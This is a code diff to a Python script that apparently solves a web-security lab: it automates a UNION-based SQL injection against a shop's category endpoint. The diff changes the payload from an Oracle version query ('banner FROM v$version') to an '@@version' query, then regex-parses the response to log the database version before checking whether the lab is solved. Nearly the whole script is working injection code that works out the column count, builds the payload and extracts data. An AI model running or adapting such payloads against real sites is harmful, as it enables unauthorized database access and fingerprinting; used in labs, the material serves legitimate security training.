@@ -22,20 +22,25 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 def main(args):
     shop = Shop(args.url, args.no_proxy)
     num_columns = utils.determine_number_of_columns(
-        shop.category_url, shop.no_proxy, oracle=True
+        shop.category_url, shop.no_proxy
         )
     if not num_columns:
         log.error("Couldn't determine number of columns. Exiting")
         sys.exit(-1)
     text_columns = utils.determine_text_columns(
-        shop.category_url, shop.no_proxy, num_columns, oracle=True
+        shop.category_url, shop.no_proxy, num_columns
     )
     nulls = ["NULL"] * num_columns
-    nulls[text_columns[0]] = "banner"
+    nulls[text_columns[0]] = "@@version"
     nulls_str = ",".join(nulls)
-    exploit = f"' UNION SELECT {nulls_str} FROM v$version--"
-    shop.get_category(exploit)
+    exploit = f"' UNION SELECT {nulls_str}-- "
+    resp = shop.get_category(exploit)
+    pattern = re.compile(r'<th>(.*?)</th>')
+    m = pattern.search(resp.text)
+    version = m[1]
+    log.info(f"We found version of database: {version}")
     shop.is_solved()
+    
     
     
 if __name__ == "__main__":
